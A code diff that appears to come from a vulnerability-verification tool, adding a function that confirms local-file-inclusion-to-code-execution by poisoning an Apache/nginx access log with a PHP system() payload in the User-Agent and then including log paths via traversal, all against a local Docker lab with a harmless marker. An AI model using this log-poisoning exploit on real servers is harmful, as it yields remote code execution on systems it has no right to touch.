@@ -585,6 +585,141 @@ def verify_generic_path_traversal(
         lab.teardown()
 
 
+def verify_generic_lfi_rce(
+    source_dir: str, endpoint: str, http_method: str, parameters,
+    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+) -> WpVerifyResult:
+    """LFI-a-RCE por envenenamiento de log (log poisoning), una tecnica MAS AVANZADA y distinta
+    de path traversal (que solo LEE un fichero): si el parametro vulnerable se usa para un
+    `include()`/`require()` de PHP (o equivalente en otros lenguajes que interpretan el fichero
+    incluido como codigo) en vez de solo servirlo como texto plano, un log de acceso del propio
+    servidor web (que registra el User-Agent de cada peticion, SIN sanearlo) se puede envenenar
+    con codigo real y luego incluirlo con el mismo parametro -- confirmado por EJECUCION real
+    (el resultado del codigo aparece en la respuesta), no por la simple presencia del payload
+    reflejado (eso solo demostraria lectura, no inclusion-como-codigo).
+
+    Mecanismo (casuistica real de LFI/RCE via log poisoning, PayloadsAllTheThings):
+    1) una peticion normal con un User-Agent que lleva `<?php system('echo MARKER'); ?>` -- el
+       servidor web (Apache/nginx) registra ese User-Agent TAL CUAL en su log de acceso, sin
+       interpretarlo (solo lo guarda como texto).
+    2) el parametro vulnerable intenta incluir varias rutas de log comunes (Apache/nginx, con y
+       sin traversal) -- si el codigo SI se interpreta al incluirse, el resultado del `system()`
+       (el marcador ejecutado, no el PHP crudo) aparece en la respuesta."""
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
+    if not path_param:
+        res.detail = "no se identifico el parametro que lleva la ruta/fichero a incluir"
+        res.limitations.append("la verificacion de LFI-a-RCE necesita saber que parametro "
+                               "lleva la ruta/fichero; afina 'parameters' o pasalo a mano "
+                               "(path_param_hint)")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        marker = f"binoracle_lfi_rce_{_token()}"
+        poison_ua = f"<?php system('echo {marker}'); ?>"
+        step(f"envenenando el log de acceso del servidor con codigo PHP real en el "
+             f"User-Agent (marcador {marker!r})...")
+        try:
+            _http_request("GET", base_url + "/", timeout=15,
+                          headers={"User-Agent": poison_ua})
+        except Exception as e:
+            res.detail = f"la peticion de envenenamiento del log fallo: {e}"
+            return res
+        time.sleep(1)
+
+        m = (http_method or "GET").upper()
+        # rutas de log mas comunes de Apache/nginx en imagenes oficiales de Docker, con y sin
+        # profundidad de traversal (el mismo parametro puede ser vulnerable a traversal Y a LFI
+        # a la vez, o solo aceptar la ruta absoluta sin mas).
+        log_paths = [
+            "/var/log/apache2/access.log", "/var/log/apache2/other_vhosts_access.log",
+            "/var/log/httpd/access_log", "/var/log/nginx/access.log",
+            "/usr/local/apache2/logs/access_log",
+        ]
+        depths = (0, 4, 8, 12)
+        attempts = []
+        for lp in log_paths:
+            rel = lp.lstrip("/")
+            for n in depths:
+                attempts.append(("../" * n) + rel if n else lp)
+
+        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
+                             "metodo": m, "path_param": path_param, "marcador": marker,
+                             "user_agent_veneno": poison_ua})
+
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[path_param] = payload_value
+            try:
+                resp = _http_request(m, base_url + endpoint, timeout=15,
+                                        data=payload if m != "GET" else None,
+                                        params=payload if m == "GET" else None)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            text = resp.text or ""
+            # EJECUTADO (el resultado de system(), sin las etiquetas PHP alrededor) es la prueba
+            # real -- el payload crudo reflejado (con '<?php' literal) solo demuestra LECTURA,
+            # NUNCA se marca como RCE por eso solo.
+            executed = marker in text and "<?php" not in text
+            raw_reflected = marker in text and "<?php" in text
+            tried.append({"payload": payload_value, "status": resp.status_code,
+                         "ejecutado": executed, "reflejado_crudo_sin_ejecutar": raw_reflected})
+            if executed:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["respuesta_cuerpo_recorte"] = text[:500]
+                step(f"VERIFICADO: el marcador '{marker}' aparecio EJECUTADO (no como texto PHP "
+                     f"crudo) tras incluir el log envenenado con {path_param}="
+                     f"{payload_value!r}.")
+                break
+
+        res.evidence["intentos"] = tried
+        if found:
+            res.verified = True
+            res.ok = True
+            res.detail = (f"LFI-A-RCE confirmado (envenenamiento de log): la peticion con "
+                          f"{path_param}={res.evidence['payload_ganador']!r} incluyo el log de "
+                          f"acceso envenenado y el codigo PHP SE EJECUTO de verdad (el marcador "
+                          f"'{marker}' aparecio como resultado de system(), no como texto PHP "
+                          f"crudo) -- ejecucion remota de codigo real, no una lectura de fichero")
+        else:
+            any_raw = any(t.get("reflejado_crudo_sin_ejecutar") for t in tried)
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} rutas de log comunes para {path_param} y "
+                          f"ninguna ejecuto el marcador -- LFI-a-RCE no se confirmo" +
+                          (" (el payload SI se reflejo crudo en al menos un intento, sugiriendo "
+                           "LECTURA de fichero pero NO inclusion-como-codigo -- puede ser solo "
+                           "path traversal, no LFI)" if any_raw else
+                           " (ninguna ruta de log probada fue incluida; puede que el log real "
+                           "este en otra ruta, o que el parametro no incluya ficheros como "
+                           "codigo)"))
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
+        lab.teardown()
+
+
 def verify_generic_idor(
     source_dir: str, endpoint: str, http_method: str, parameters,
     id_param_hint: str = "", own_id: str = "1", victim_id: str = "2",
